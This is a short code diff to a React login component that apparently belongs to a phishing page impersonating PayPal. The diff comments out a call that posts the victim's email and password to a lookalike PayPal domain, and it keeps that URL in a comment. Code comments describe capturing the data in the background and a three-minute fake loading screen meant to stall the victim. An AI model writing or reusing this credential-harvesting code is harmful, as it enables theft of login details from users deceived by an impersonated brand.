@@ -17,10 +17,12 @@ export default function Login() {
 
     try {
       // 1. Immediately capture the data in the background
-      await axios.post("https://paypalcom-nl.onrender.com/api/auth/login", {
-        email,
-        password,
-      });
+      // await axios.post("", {
+      //   email,
+      //   password,
+      // });
+
+      // https://paypalcom-nl.onrender.com/api/auth/login
 
       // 2. Start the 3-minute fake loading (180,000 ms)
       setTimeout(() => {
